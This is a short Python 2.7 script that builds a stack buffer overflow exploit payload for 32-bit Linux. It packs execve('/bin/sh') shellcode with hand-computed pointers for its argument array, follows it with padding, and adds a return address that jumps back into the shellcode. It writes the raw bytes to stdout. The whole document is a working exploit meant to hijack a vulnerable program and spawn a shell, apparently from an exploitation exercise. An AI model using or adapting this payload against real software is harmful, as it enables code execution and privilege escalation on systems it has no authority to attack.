#!/usr/bin/python2.7
import struct,sys;
LOCAL=int(sys.argv[1],0);
PADDING=int(sys.argv[2],0);
ARGG=struct.pack("I",LOCAL+26);
ARGG0=struct.pack("I",LOCAL+18);
ENTRY=struct.pack("I",LOCAL);
PAYLOAD ="\xb9"+ARGG; # +0 mov $0x804848b,%ecx
PAYLOAD+="\xbb"+ARGG0; # +5 mov $0x8048482,%ebx
PAYLOAD+="\x31\xc0\x31\xd2\xb0"; # +10 bla bla
PAYLOAD+="\x0b\xcd\x80"; # +15 bla bla
PAYLOAD+="/bin/sh\x00"; # +18 /bin/sh
PAYLOAD+=ARGG0; # +26 name[0]
PAYLOAD+="\x00\x00\x00\x00"; # +30 name[1]
PAYLOAD+="A"*PADDING; # +34
PAYLOAD+=ENTRY; # +44 ret to Shellcode (var local).
sys.stdout.write(PAYLOAD);